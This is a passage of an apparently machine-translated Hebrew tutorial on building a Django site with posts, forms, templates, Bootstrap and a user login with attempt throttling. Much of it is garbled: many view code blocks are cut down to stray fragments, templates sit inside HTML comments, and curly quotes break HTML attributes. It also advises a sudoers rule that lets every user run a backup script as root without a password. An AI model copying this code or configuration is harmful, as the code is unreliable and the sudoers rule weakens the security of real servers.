</code></pre>עכשיו, בואו נגדיר את דפוס התצוגה. לדפוסי התצוגה יש שלושה רכיבים, רכיב הנתיב, המספר לשרת היכן התצוגה קיימת בתוך השרת (נתיב ה- URL שהמשתמש מקליד לסרגל הניווט כדי להיכנס לדף האינטרנט), רכיב התצוגה בו מצוין התצוגה, ו- שם ידידותי לתצוגה כך שקל לאחזר את התבנית שלו בעת עבודה עם תבנית, במיוחד כך שניתן לשנות את השם ולעדכן במידת הצורך כדי לפנות מקום לתצוגה אחרת או לקחת שם הגיוני יותר. הגיוני לעשות דברים בדרך זו ולהיות גמישים, מכיוון שבסיס הקוד שלך יהיה סביבה משתנה אי פעם שצריכה גמישות ואלתור על מנת להיות בעלת ערך וקל לעבוד איתה. הנה איך תיראה התצוגה שלך, אתה יכול להוסיף את זה ל- urlPatterns = [קטע של App/urls.py. דפוס התצוגה מוגדר עם שלושת הרכיבים שתוארו לעיל, ופונקציה הנקראת נתיב. דפוסי כתובת האתר שלך הם רשימה, לכן הקפד לסיים תמיד כל פריט בהםעם פסיק, מכיוון שזה מפריד בין כל אחד מהם. כל פריט צריך גם לעלות על שורה חדשה, שוב עם ארבעה חללים לפניו, ממש כמו האפליקציה ב- Settings.py. נגדיר את הרכיב הראשון בתצוגה עם פונקציית מחרוזת ריקה, על מנת ליצור תצוגה הפועלת בספריית השורש של שרת האינטרנט. עכשיו URLs.py שלך צריך להיראות כמו<pre class="language-python"><code>
from feed import views as feed_views

urlpatterns = [
    path('', feed_views.hello, name='hello'),
]
</code></pre>זה הבסיס ליצירת אתר עם Django שהוא סטטי לחלוטין. על מנת ליצור אתר דינמי יותר בו נוכל להתחיל במטמון מידע, כמו תמונות, סרטונים, שמע ועוד, נצטרך להשתמש בדגמים, אותם נחקור בהמשך. לעת עתה, בואו נבדוק את הקוד שלנו ונפעל את השרת. כדי לבדוק את הקוד שגיאות, הפעל:<pre class="language-bash"><code>
python manage.py check
</code></pre>אם יש הודעות שגיאה, עליך לבדוק בזהירות את השינויים שביצעת באפליקציה שלך ולראות אם יש משהו שצריך לתקן, כמו חלל זרים או חסר, תו נוסף, מחרוזת לא סגורה, כל שגיאת הקלדה, בכל טעות אופי שנמחק, או כל דבר אחר. קריאת הודעת השגיאה (אם יש לך אחת), אתה אמור להיות מסוגל לראות את הנתיב לקובץ שיצרת או ערכת יחד עם מספר שורה, אז בדוק את הקובץ והקו הזה ובדוק אם אתה יכול לתקן משהו שיש שם ו אם תיקנת את הבעיה, הפעל את הפקודה לעיל שוב. כאשר התוכנה שלך מוכנה להפעלה ועובדת, תראה את הפלט "בדיקת מערכת לא זיהתה שום בעיות." עכשיו אתה מוכן ללכת. הפעל את השרת עם:<pre class="language-bash"><code>
python manage.py runserver 0.0.0.0:8000
</code></pre>כעת פתחו דפדפן אינטרנט ונווט אל http: // localhost: 8000. אתה אמור לראות את הטקסט המוחזר בסוגריים וציטוטים של פונקציית HTTPRESPONSE בתצוגה שלך. זו רק דוגמא בסיסית, אבל אם היית עושה את זה עד כה, אתה מבין את היסודות של עבודת לינוקס, באש, פייתון ודג'נגו. בואו נחפור עמוק יותר במודלים של מסדי נתונים, ונחקור את הכוח של כיתת פייתון באחסון מידע. לאחר מכן, נתחיל לאחוז ב- HTML ו- CSS לפני שנהפוך את האתר שלנו למציג מלא, גמיש ומאובטח באמצעות JavaScript ולמידת מכונה.

השיעורים מאוחסנים בדגמים. Py של האפליקציה שלך. באמצעות NANO, ערוך אפליקציה/models.py והוסף כיתה חדשה. מחלקה מוגדרת עם הגדרת הכיתה ומעבירה סכום -על ממנו הוא יורש, במקרה זה מודלים. מודל. שם השיעור מגיע לאחר הגדרת הכיתה, ואחרי הגדרת הכיתה א ': (קולון) משמש, לפני שתכונות ההגדרות של התכונות והגדרות הפונקציה הקשורות לכיתה. הכיתה שלנוזקוק למזהה בו אנו יכולים להשתמש כדי לאחזר אותו ולשמור עליו ייחודי, והוא גם זקוק לשדה טקסט כדי לאחסן מידע כלשהו. בהמשך אנו יכולים להוסיף חותמת זמן, קבצים, בוליאנים (הגדרות אמיתיות או שווא שיכולות לעזור לקוד שלנו לקבל החלטות מה לעשות עם הדגם, וניתן להשתמש בהן כדי למיין אותו), מופע כדי לקשור את הדגם למשתמש שנרשם לשרת ועוד. בואו נפרק את הקוד<pre class="language-python"><code>from django.db import models # היבוא המשמש להגדרת הכיתה שלנו ותכונותיו
class Post(models.Model): # ההגדרה של הכיתה שלנו עצמה
    id = models.AutoField(primary_key=True) # המזהה של המודל שלנו, מפתח שנוצר אוטומטית שיאפשר לנו לשאול את הדגם, לשמור עליו ייחודי, והוא שימושי כשאנחנו צריכים ליצור אינטראקציה עם הדגם לאחר שנוצר.
    text = models.TextField(default='') # התכונה חנויות הכיתה שלנו, במקרה זה, טקסט כלשהו, ​​מחליפה למחרוזת ריקה.</code></pre>סגור ושמור את הקובץ כפי שעשינו קודם כדי לסיים.

ישנם שדות ואפשרויות רבות אחרות שנחקור כאשר אנו מעדכנים כיתה זו ככל שהתפתחה האפליקציה שלנו, אך זהו הצרכים הבסיסיים של יצירת אפליקציה לפרסום טקסט כלשהו. עם זאת, מודל זה לא יעבוד לבד. כמתואר קודם, נצטרך תצוגה מותאמת אישית ותבנית כתובת אתר מותאמת אישית כדי לגרום למודל זה לעבוד, ואנחנו נצטרך גם טופס יחד עם תבנית. בואו נחקור את הטופס קודם.

כדי להגדיר טופס, ערוך אפליקציה/forms.py עם ננו והוסף את השורות הבאות. נצטרך שני יבוא, מחלקת הטפסים שלנו, כמו גם את המודל שיצרנו (Feed.Models.Post), הגדרת מחלקה הדומה למודל, ושדה יחד עם תת -סוג שנקרא Meta שיגדיר את המודל שהצורה מתקשרת עִם. לטופס יכול להיות גם פונקציית אתחול שמגדירה אותה על סמך מידע בבקשה, מודל או אחרת, נחקור זאת בהמשך.

צורות מודל כל כך שימושיות מכיוון שהן יכולות ליצור מודל או גם לערוך מודל,אז אנו נשתמש בהם לשניהם. בואו נגדיר אחד בצורות.<pre class="language-python"><code>
from django import forms
from feed.models import Post

class PostForm(forms.ModelForm):
    text = forms.CharField(widget=forms.Textarea)
    class Meta:
        model = Post
        fields = ('text',)
</code></pre>זה היסודות של איך נראים צורה ודגם. ניתן להשתמש בטופס מודל זה כדי להפעיל או לערוך פוסט, ולשנות את הטקסט שהוא מכיל. נסתכל על שילוב טופס זה בתצוגה הבאה. ראשית, בואו נעשה את ההגירה ונעביר את מסד הנתונים כך שהקוד שלנו יוכל לקיים אינטראקציה עם הדגם כאשר הוא פועל. לשם כך, הפעל את הפקודות הבאות:<pre class="language-bash"><code>
python manage.py makemigrations
python manage.py migrate
</code></pre>זה ייקח דקה לביצוע, אך ברגע שזה יקרה, זה יאפשר לך לגשת לדגם בתצוגות, בתווך או בכל מקום אחר בתוכנה. בואו נמשיך על ידי צפייה בה אנו יכולים לראות את המודל שלנו. ערוך FEED/Views.PY והוסף את הקוד הבא, כאמור. לא תצטרך להוסיף שום דבר לאחר סימן #, קוד זה הערות המשמשות לציון מידע על הקוד. נתחיל בייבוא ​​המודל שלנו בתצוגות, ונוסיף אותו להקשר בו אנו יכולים להעביר אותו בתבנית כרשימה לתצוגה. בשלב הבא נוסיף תבנית בה אנו יכולים להעניק את הטופס ואת הדגם עם כפתור ליצירת אובייקט חדש המבוסס על הדגם ולפרסם אותו לשרת. זה נשמע מסובך, אז בואו פשוט ניקח את זה צעד אחר צעד. לפני שנסיים את התצוגה, בואו ניצור תבנית שפשוט הופכת את הדגם וודא שנוכל לראות אותו על ידי יצירת פוסט חדש במעטפת. כך נראה התצוגה הזו:<pre class="language-python"><code>    posts = Post.objects.all() # שאילתה את כל הפוסטים במאגר עד כה</code></pre>כל זה נראה די פשוט עד שנגיע לתחתית. העבר, הערך שהוחזר על ידי הפונקציה במקום בתגובה HTTP כמו הדוגמה הקודמת, תמיד לוקח בקשה כקלט הראשון שלה, מקבל הקשר (במקרה זה הפוסטים בבסיס הנתונים), שכעת ניתן להעביר בתבנית , ומחזיר את התבנית המוגדרת בפונקציה. התבנית הולכת להיות מסמך HTML עם מעט שפה בשם Jinja2, מה שהופך את המידע של פייתון ל- HTML. 

כדי להתחיל ליצור תבניות, ערוך שני ספריות בעדכון.<pre class="language-bash"><code>
mkdir feed/templates
mkdir feed/templates/feed
</code></pre>בשלב הבא, ערוך תבנית בספריה שלמעלה, הזנה/תבניות/הזנה והוסיפו את הקוד לדוגמה זו. בואו נסתכל על התבנית לדוגמא זו.<pre class="language-markup"><code><!-- 
<!doctype HTML>
<html>
<body>
<legend>Feed</legend>
<hr>
{% for post in posts %}
<p>{{ post.text }}</p>
{% endfor %}
</body>
</html>
 --></code></pre>זוהי תבנית פשוטה מאוד. זה מגדיר פתיחה וסגירת תגי HTML, תג סוג מסמך, תג גוף עם כותרת אגדה, תג הפסקה שמוסיף שורה קטנה על המסך, ולולאה שהופכת כל פוסט ברשימת הפוסטים כפסקה ב התבנית. זה כל מה שנדרש כדי לפנות פוסטים, אך עדיין אין במאגר. בואו ניצור כמה עם הקליפה. אנחנו יכולים להריץ את הקליפה עם Manage.py<pre class="language-bash"><code>
python manage.py shell
</code></pre>עכשיו, בואו נביט את דגם הפוסט שלנו<pre class="language-python"><code>
from feed.models import Post
</code></pre>בשלב הבא ניצור פוסט פשוט עם מחרוזת ונצא מהקליפה. המחרוזת יכולה להיות כל דבר, כל עוד הטקסט התקף.<pre class="language-python"><code>
Post.objects.create(text='hello world')
exit()
</code></pre>לבסוף, נצטרך להוסיף דפוס כתובת אתר לעדכון שלנו. מכיוון שאפליקציית ההזנה שלנו תשתמש בכתובות אתרים מרובות ואנחנו רוצים לשמור על גדלי קבצים קטנים, בואו ניצור כתובות URL מקומיות באפליקציית ההזנה שלנו שנראית כך:<pre class="language-python"><code>
from django.urls import path
from . import views

urlpatterns = [
    path('', views.feed, name='feed'),
]
</code></pre>נצטרך גם לערוך את ה- URLs.PY באפליקציית הבסיס, כל מה שהחלטנו לקרוא לזה, זה היה הספרייה הראשונה שיצרנו. ערוך אפליקציה/app.py והוסף את הדברים הבאים לדפוסי כתובת האתר<pre class="language-python"><code>from django.urls import include # בחלקו העליון
    # ... קוד קודם כאן</code></pre>כעת, כאשר אנו מפעילים את השרת עם Python Manage.py Runserver, נראה את הדף שיצרנו מכיוון שיש לנו את הדגם, התצוגה והתבנית כמו גם את דפוס ה- URL, יחד עם פריטים במאגר. בשלב הבא, בואו ליישם את הטופס שיצרנו ונתחיל ליצור פוסטים משלנו. אבל לפני שנכתוב יותר מדי קוד, בואו נעשה גיבוי באמצעות הסקריפט שכתבתי קודם, גיבוי. הפעל את התסריט הזה במעטפת, המתן כמה רגעים, וכל הקוד יגובה במאגר GIT שלנו.<pre class="language-bash"><code>
backup
</code></pre>יישום הטופס הוא פשוט יחסית. אנו נביט את הטופס שלנו, הוסף מטפל בקשת פוסט לתצוגה ונשמור את הפוסט במסד הנתונים לפני הפנייתו לאותה תצוגה. אנו יכולים להשתמש בפונקציית ההפניה שכבר ייבאו, ופונקציה אחרת שנקראה הפוך כדי לקבל את כתובת האתר לתבנית התצוגה. אנו נשאל זאת עם המחרוזת 'הזנת: הזנה' מכיוון שמרחב השמות של התבנית הכלולה הוא הזנה, והתצוגה נקראת גם Feed.<pre class="language-python"><code>    posts = Post.objects.all() # שאילתה את כל הפוסטים במאגר עד כה
    if request.method == 'POST': # טפל בבקשת ההודעה
        form = PostForm(request.POST) # צור מופע של הטופס ושמור אליו את הנתונים
        if form.is_valid(): # לאמת את הטופס
            form.save() # שמור את האובייקט החדש
        return redirect(reverse('feed:feed')) # להפנות לאותה כתובת אתר עם בקשת GET
        'form': PostForm(), # הקפד להעביר את הצורה להקשר כדי שנוכל לספק אותה.</code></pre>כעת, נצטרך לעדכן את התבנית כדי להסביר את הטופס החדש. אנו יכולים לעשות זאת באמצעות<form>תייג ב- HTML והעניק את הטופס בתבנית HTML עם כפתור הגשה. אנו נצטרך גם אסימון CSRF, אסימון המונע את האתרים החיצוניים לפרסם לטופס מבלי לטעון תחילה דף.<pre class="language-markup"><code><!-- 
<!doctype HTML>
<html>
<body>
<legend>Feed</legend>
<form method=”POST”>
{% csrf_token %}
{{ form }}
<button type=”submit”>New Post</button>
</form>
<hr>
{% for post in posts %}
<p>{{ post.text }}</p>
{% endfor %}
</body>
</html>
 --></code></pre>בואו נשבר את זה. יש מחלקת טופס חדש, אסימון, הטופס עצמו וכפתור הגשה. די פשוט, אבל כשאנחנו מסתכלים על זה, אולי נרצה לגרום לזה להיראות טוב יותר. זה עובד, אנחנו יכולים לפרסם פוסטים חדשים עם הטופס והם נשמרים כעת במסד הנתונים. יש כאן כמה דברים שקורים. אנו משתמשים בתגי HTML כדי להכריז כי המסמך הוא מסמך HTML, אנו משתמשים בתג תבנית ({ %… %}) כדי להפוך את האסימון לטופס, ועוד, {{…}} כדי להעניק את הטופס. יש לנו גם לולאה להעניק את הטקסט באמצעות תגי חסימות ותג תבנית. תגי חסימות חשובים באמת מכיוון שאנו יכולים להגדיר כיצד ניתן להבחין בקטעי התבנית איתם, ותגי תבנית הם הבסיס לאופן בו אנו מכניסים משתנים לקוד שלנו.

עכשיו עלינו לגרום לאפליקציה שלנו להיראות טוב יותר, כי בינתיים היא נראית ממש בסיסית. אנו יכולים לעשות זאת על ידי שימוש ב- CSS, או בשורה או בשיעורים הקשורים לכל אובייקט במסמך. CSS זה ממש נחמד כי זה אומר הכל בדף איך הוא צריך להיראות,ויכול לגרום לזה להיראות ממש טוב. יש כמה ספריות שיכולות לעשות זאת, אבל ההליכה האישית שלי היא Bootstrap. 

ניתן להוריד את Bootstrap מאתר האינטרנט שלהם,<a href="https://getbootstrap.com/" id="external-link" title="Visit this link (it will take you outside of Lotte Harper)">getBootstrap.com/</a>ו לאחר שם, לחץ על הכפתור כדי לקרוא את מסמכי ההתקנה, והעתק את הקוד מהסעיף כולל באמצעות CDN. תזדקק לקוד זה בראש מסמך HTML שלך, בתג שנקרא Head. כמו כן, בואו נמשיך ליצור תבנית בסיס כך שלא נצטרך ליצור מחדש את הקישורים האלה בכל תבנית. 

ערוך ספרייה חדשה שנקראת תבניות עם תבניות MKDIR, ואז ערוך תבניות/base.html.

זה אמור להיראות כך:<pre class="language-markup"><code><!-- 
<!doctype HTML>
<html>
<head>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
</head>
<body>
{% block body %}
{% endblock %}
</body>
</html>
 --></code></pre>הקפד להעתיק את ה- CSS ו- JavaScript, את קבצי ה- .css ו- .js, מכיוון שנצטרך ל- JavaScript כדי להפוך את האתר שלנו לפונקציונלי יותר בעתיד.

עכשיו, בואו נחזור למעטפת הבסיס ונרץ פקודה מהירה. זכור, אם אי פעם תצטרך לגשת לסביבה הווירטואלית, הקלד מקור venv/bin/הפעלה. זה יאפשר לך להתקין חבילות פייתון באופן מקומי באופן המאפשר ל- Django לגשת אליהם. כדי לתת את הטפסים שלנו שנוצרו על ידי שיעורי Django Bootstrap, אנו נשתמש בחבילת פייתון בשם צורות פריכות. אנו יכולים להוריד זאת עם הפקודה הבאה<pre class="language-bash"><code>
pip install django-crispy-forms
</code></pre>לאחר התקנת זה, הוסף אותו ל- Settings.py<pre class="language-python"><code>    # ... קוד קודם כאן</code></pre>כעת, חזרה בתבנית ההזנה שלנו, אנו יכולים להסיר כמה דברים. בואו נסיר את תחילתו וסופו של המסמך ונחליף אותו בירושה מתבנית הבסיס שלנו, תוך שימוש בהרחבות והגדרת החסימה. כמו כן, נוסיף יבוא מסנן תבנית עם עומס ומסנן תבנית לטופס. לבסוף, בואו נוסיף לכפתור כיתת Bootstrap כדי לגרום לו להיראות יותר כמו כפתור. זה אמור להיראות כך:<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% block body %}
{% load crispy_forms_tags %}
<form method=”POST”>
{% csrf_token %}
{{ form|crispy }}
<button type=”submit” class=”btn btn-outline-primary”>New Post</button>
</form>
<hr>
{% for post in posts %}
<p>{{ post.text }}</p>
{% endfor %}
{% endblock %}
 --></code></pre>יָפֶה! זה כבר לא מעט קוד. בשלב הבא עלינו לבדוק את זה ולוודא שנוכל לראות שהכל נראה נחמד, וגם להיות בטוח שהכל עובד כמו שצריך. הפעל את השרת לפי הוראות קודמות וודא שהאתר נראה ועובד בסדר. עבודה נהדרת! אתה מוכן לעבור לשלב הבא, בו נוסיף פונקציונליות כניסה למשתמש באמצעות כתובות אתרים, צורות, תצוגות ותבניות דומות. תבנית הבסיס חשובה, ואנחנו נמשיך לשנות אותה ולבצע שינויים לפי הצורך, אך לעת עתה בואו נתמקד בהפיכת האתר שלנו לבטוח יותר, על ידי כך שאפשר למשתמשים להתחבר עם שם משתמש ובקוד סיסמה, ובסופו של דבר מידע חשוב עוד יותר יעזור לשמור על האפליקציה שלך מאובטחת וחשבון משלך נגיש רק על ידך.

לשם כך, עלינו להשתמש במודל המשתמש המובנה ב- Django. מודל המשתמש הוא מודל מסד נתונים, כמו הפוסט שלנו, שניתן להעביר כדי לרשום משתמש לאתר. בעתיד, לפני שנפרוס את האתר לאינטרנט, אנו נעשה זאתהרחב מודל זה עם דגמים אחרים המיוחסים אליו, ובנה אמצעי אבטחה נוספים עבור הכניסה העמידים בפני דיוג. נתחיל להשתמש בכמה צורות כניסה מובנות ש- Django מספק. ראשית, בואו ניצור אפליקציה חדשה בה אנו נשתמש בכדי להציג את התבניות והתצוגות לדף הכניסה הבסיסי. אנו ניצור גם אפליקציות אחרות לייצוג את אתגרי ההתחברות המתמשכים על מנת לאבטח את האפליקציה, כולל PINCODE, זיהוי פנים, תקשורת שדה קרוב, מכשירים חיצוניים, אימות רב גורם וגורם וזיהוי טביעות אצבע.

כבר דיברנו על הקמת אפליקציה. מהספרייה שלנו, בתוך הסביבה הווירטואלית, עברו את ניהול.<pre class="language-bash"><code>
python manage.py startapp users
</code></pre>כעת, עלינו לקבל ספרייה לאפליקציה החדשה. נתחיל ביצירת תצוגה בספריה ההיא המתאימה להתחברות המשתמש. Django בנה תצוגות לכניסות משתמשים, אך אלה לא יתאימו לנו מכיוון שאנו זקוקים לתצוגה מותאמת אישית, שעדיף לעשות עם הגדרה.

בתצוגה זו נתחיל בבדיקת בקשת פוסט, תעבור בקשה. הפוסט לצורת כניסה המיובאת מ- Django, לאמת את חשבון המשתמש ולהיכנס למשתמש לפני שנפנה אותם לאפליקציית Feed שלנו.

במשתמשים/views.py, הוסף את הקוד הבא<pre class="language-python"><code>        username = request.POST['username'] # קבל את שם המשתמש והסיסמה מבקשת ההודעה
        password = request.POST['password'] # לאמת את המשתמש</code></pre>זה כל מה שאתה צריך לתצוגת כניסה בסיסית. כעת, בואו ניצור טופס לתצוגה על ידי הרחבת תבנית הבסיס. נתחיל ביצירת ספרייה חדשה לתבניות בתיקיית המשתמשים.<pre class="language-bash"><code>
mkdir users/templates
mkdir users/templates/users
</code></pre>כעת, עלינו להיות מסוגלים לערוך משתמשים/תבניות/משתמשים/login.html. בזמן שאנחנו בעניין, ניצור תבנית שתאפשר למשתמש להירשם גם כן.<pre class="language-bash"><code>
nano users/templates/users/login.html
</code></pre>עכשיו, בתבנית,<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
<form method="POST">
    {% csrf_token %}
    <fieldset class="form-group">
        <legend class="border-bottom mb-4 break">Log In</legend>
        {{ form|crispy }}
    </fieldset>
    <div class="form-group">
        <button class="btn btn-outline-info" type="submit">Login</button>
    </div>
</form>
{% endblock %}
 --></code></pre>זהו היסודות של תבנית כניסה. זה באמת ממש כמו התבנית האחרת במבנה, אבל היא נראית קצת שונה כשהיא ניתנת. אנו יכולים להעתיק קוד זה כדי לבנות תבנית דומה מאוד דומה בשם Register.html, שם נשנה את הנוסח ונשתמש בטופס חדש שאנו בונים. בואו נעשה את התבנית קודם. ערוך משתמשים/תבניות/משתמשים/register.html והוסף את הקוד הבא:<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
<form method="POST">
    {% csrf_token %}
    <fieldset class="form-group">
        <legend class="border-bottom mb-4 break">Create an account</legend>
        {{ form|crispy }}
    </fieldset>
    <div class="form-group">
        <button class="btn btn-outline-info" type="submit">Register</button>
    </div>
</form>
{% endblock %}
 --></code></pre>כעת, בואו נבנה טופס לרישום המשתמש שלנו ונחזור לתצוגות לפני שנשדרג את כניסה למשתמש שלנו באמצעות מודל. אנו נעשות טופס זה בסיסית מלכתחילה, אך נוכל לשלב פרטים נוספים ותכונות אבטחה כמו הסכמים וקפטצ'ה בעתיד. ערוך את הטפסים עם משתמשי NANO/Forms.PY, והוסף את הקוד הבא.<pre class="language-python"><code>
from django import forms
from django.contrib.auth.models import User
from django.contrib.auth.forms import UserCreationForm

class UserRegisterForm(UserCreationForm):
    email = forms.EmailField()

    class Meta:
        model = User
        fields = ['username', 'email', 'password1', 'password2']
</code></pre>אז יש לנו כאן צורה אחרת, שעובדת די בפשטות. זהו טופס רישום משתמשים עם שם משתמש, דוא"ל וסיסמא, כמו גם שדה אישור סיסמא. שימו לב כי טופס זה אינו מרחיב את הטפסים הרגילים. מחלקת צורה, זהו צורת דגם שמשמעותה שיש לה מטא. שדה אחד מוגדר בדיוק אותו דבר, ומטא הכיתה מגדיר את המודל שהטופס תואם את שאר המידע שייכתב לטופס. רוב זה כבר קיים בצורת המשתמש המובנית של Django, ולכן נשתמש בזה כבסיס לכיתה (שהועבר בסוגריים).

בשלב הבא נבחן את התצוגה לרשום משתמש, כעת כשיש לנו טופס ותבנית. זהו modelform, ממש כמו זה שנמצא בתצוגת הפוסט החדשה. ערוך משתמשים/views.py והוסף את הקוד הבא:<pre class="language-python"><code># ... יבוא</code></pre>זה כל מה שאנחנו צריכים כדי לרשום משתמש, אך עלינו לקבל מידע נוסף. אנו רוצים לדעת את הזמן בו נרשם המשתמש, באיזו שעה היה האחרון באתר, קצת מידע עליהם, כמו ביוגרפיה, אזור זמן וכו '. כמו כן, נצטרך לעדכן את מודל ההזנה שלנו, לפרסם, כדי להסביר את המשתמש דגם ומייחס פוסטים לכל משתמש. כדי לעשות זאת, אנו נעדכן את הדגמים. PY בשני האפליקציות. נתחיל בעריכת דגם ההזנה. זה אמור להיראות כך עכשיו:<pre class="language-python"><code>from django.db import models # ... יבוא
    author = models.ForeignKey(User, on_delete=models.CASCADE, null=True, blank=True, related_name='posts') # הוסף בשורה זו</code></pre>שימו לב לשורה השנייה שנוספה לקובץ. זהו מפתח זר, שייחסר כל פוסט למשתמש יחיד לכל פוסט, כך שנוכל לוודא שנשמור את הפוסטים על בסיס משתמש למשתמש ולא ניתן להעלות פוסט מבלי לייחס אותו למשתמש. אנו מגדירים את המפתח הזר הזה עם הכיתה שהוא מייצג, טיעון מחק כדי להבטיח שהפוסטים יימחקו עם משתמשים, בנות וריקות כדי לוודא שנוכל להסיר את המשתמש במידת הצורך, ולהתאים לחוסר משתמש בפוסטים שאנחנו כבר נוצר ושם קשור, בו אנו יכולים להשתמש כדי להתייחס לאובייקטים של הפוסט שהמשתמש יוצר. שם קשור זה, בניגוד ל- Post.author, מחבר הפוסט, נותן לנו למשתמש שפרסם את הפוסט עצמו. כעת אנו יכולים לקבל את הפוסטים שמשתמש שנעשה על ידי הפעלת user.posts.all (), או מחבר. Posts.all ().

עכשיו, בואו נהפוך את ההתחברות שלנו לגמישות יותר. אנחנו כבר יכולים להפוך את האתר שלנו להרבה פחות פגיע לדיוג על ידי פשוט להגביל את מספר הפעמים שנאפשר התחברות לאתר, זה די קל. בואו נתחיל לאחסן קצת מידע על כל משתמש לפני שאנחנו ממשיכים לפתח את האפליקציה שלנו. עריכת משתמשים/models.py, הוסף את הדברים הבאים<pre class="language-python"><code>
from django.db import models
from django.contrib.auth.models import User
from django.utils import timezone

class Profile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, null=True, blank=True, related_name='profile')
    account_created = models.DateTimeField(default=timezone.now)
    last_seen = models.DateTimeField(default=timezone.now)
    can_login = models.DateTimeField(default=timezone.now)
    preferred_name = models.CharField(max_length=20,default='', null=True, blank=True)
    bio = models.TextField(blank=True, default='')
</code></pre>שים לב שמודל זה דומה למדי לדגם הפוסט. יש לנו ייבוא ​​נוסף, אזור זמן, שיאפשר לנו להגדיר ברירות מחדל בשדות DateTime, ויש לנו גם תווים ושדה טקסט כמו הפוסט. השימוש בכל חותמות הזמן הללו עוזר לנו לאבטח את האתר ולהבין את השימוש בו, ושדות הטקסט מאפשרים לנו להעניק מידע על כל משתמש, או מחבר, באתר. שדה Onetoonefield צריך להיות השיקול הקלה היחיד, הוא מתנהג בדיוק כמו מראש אך עם רק אחד לכל מודל שלאחר מכן. בדרך זו, למשתמש יש רק פרופיל אחד, בעוד שיש לו פוסטים רבים.

כעת, בואו נשפר את הכניסה שלנו ונרשם לתצוגות כדי להסביר את הפרופיל. ראשית, ערוך משתמשים/views.py והתמקד בתצוגת הפנקס:<pre class="language-python"><code># ... יבוא
            Profile.objects.create(user=user) # הקפד להוסיף שורה זו, כדי ליצור פרופיל למשתמש</code></pre>זה פשוט יוצר פרופיל למשתמש, מבלי למלא אף אחד מהמידע. כעת, אנו רוצים לוודא שלא ניתן לחבר את חשבון המשתמש לעיתים קרובות מדי, או לפחות לא ניתן לנסות סיסמאות לעתים קרובות מדי, אז בואו נעדכן את תצוגת ההתחברות.<pre class="language-python"><code># ... יבוא
        if user and user.profile.can_login &lt; timezone.now(): # שים לב שעכשיו אנו בודקים אם המשתמש יכול להתחבר
        else: # אם הכניסה לא הייתה מוצלחת,
            user = User.objects.filter(username=username).first() # זה החלק בו אנו מעדכנים את פרופיל המשתמשים
                profile.can_login = timezone.now() + datetime.timedelta(seconds=15) # אז הם לא יכולים להתחבר שוב לכמה שניות</code></pre>זהו הבסיס הבסיסי של האבטחה. וודא שהאתר אינו חשוף למישהו פשוט מנסה כל שילוב אפשרי של סיסמאות, או אפילו מעטים מהם בו זמנית. זה לא יהיה מתסכל עבור המשתמש הרגיל שמכיר את קוד הסיסמה שלו ופשוט נכנס לכמה מכשירים, אבל זה ישמור על מספר רב של רובוטים דיוג מהאפליקציה. שים לב שהוספנו הצהרת IF עם משתנה, Can_Login, זה אמור להיות זמן בעבר, ולעדכן אותה עם כל כניסה לא מוצלחת באמצעות אותו שם משתמש. בדרך זו, משתמש זדוני לא יוכל לנחש סיסמה בשום מקום קרוב באותה מהירות. ניתן לעדכן גם את מספר השניות ב- DateTime.Timedelta (), והאתר יהיה גמיש יותר ועם זאת מעט פחות שמיש עם יותר שניות. אני ממליץ 15 מלכתחילה.

זכור, בנינו תסריט גיבוי כדי להציל את העבודה שלנו, אז בואו נמשיך לגבות את מה שיש לנו עד כה כדי לוודא שהכל שנשמר. הפעל את הפקודה:<pre class="language-bash"><code>
sudo backup
</code></pre>שוב, זה יחסוך את העבודה שלך עד כה. אני ממליץ להריץ גיבויים תכופים כדי לחסוך את העבודה שלך, ואולי אפילו תרצה להריץ עבודת גיבוי באופן אוטומטי. אתה יכול לעשות זאת באמצעות כלי עזר של UNIX בשם CRON. כדי להפעיל כלי עזר זה, הפעל את הפקודה הבאה והזן את הסיסמה שלך:<pre class="language-bash"><code>
sudo crontab -e
</code></pre>אם עדיין לא בחרת באפשרות 1 עבור NANO, עורך הטקסט שאתה כבר צריך להכיר ולגלול לתחתית הקובץ באמצעות מקשי החצים. הוסף את השורה הבאה:<pre class="language-bash"><code>
0 * * * * sudo backup
</code></pre>CRON משתמשת בדקה הפורמט, שעה, יום בחודש, חודש, יום שבוע, שם A * או מספר מייצגים מתי להפעיל את הפקודה. בעזרת 0 לרגע ו * לשאר האפשרויות, נוכל להריץ פקודה בדקה הראשונה בכל שעה בתחילת הדקה. זה מאפשר לנו לגבות את הקוד באופן אוטומטי. כל העבודות של CRON כאשר מבוצעות עם SUDO RUCE כשורש, כך שלא נצטרך להקליד סיסמה בכל שעה.

כדי להקל על גיבוי הקוד שלנו מבלי להשתמש בסיסמה, בואו נשבית את הסיסמה לפקודת הגיבוי שלנו. אנו נעשה זאת על ידי ביצוע הפקודה הבאה והזנת סיסמה:<pre class="language-bash"><code>
sudo visudo
</code></pre>עכשיו, בואו לגלול לתחתית הקובץ ונוסיף שורה נוספת:<pre class="language-bash"><code>
ALL ALL=NOPASSWD: /bin/backup
</code></pre>זה מאפשר לנו להריץ את הפקודה "גיבוי" כמשתמש, ללא סיסמה. הפורמט לכך קל, פשוט קידום הקו עם "הכל = nopasswd:/bin/" וסוף עם הפקודה, למשל/bin/גיבוי, שקיים ב-/usr/bin/.

עכשיו, נתחיל לעבוד עם דוא"ל. דוא"ל חשוב באמת לאתרים, מכיוון שזו דרך לשמור על אתר מאובטח יותר, לאמת שמשתמשים הם אנשים אמיתיים ואפילו מוצרים או שירותים לשוק ללקוחות. אנשים רבים שתפקידים באינטרנט בודקים את הדוא"ל שלהם מדי יום, ומקבלים כל מיני דוא"ל שיווקי אודות מוצרים ושירותים שהם מעוניינים בהם. יש כמה אפשרויות בכל הקשור לאפשר דוא"ל באתר Django, ואתה מוזמן לבחור מה שמתאים לך ביותר עבורך.

ראשית, אתה יכול לשלם עבור שירות דוא"ל שיאפשר לך לשלוח דוא"ל מהתחום שלך ודורש קוד מינימלי. ישנם שירותים רבים המציעים זאת, כמו סביבת העבודה של גוגל, SendInblue, MailGun ועוד.

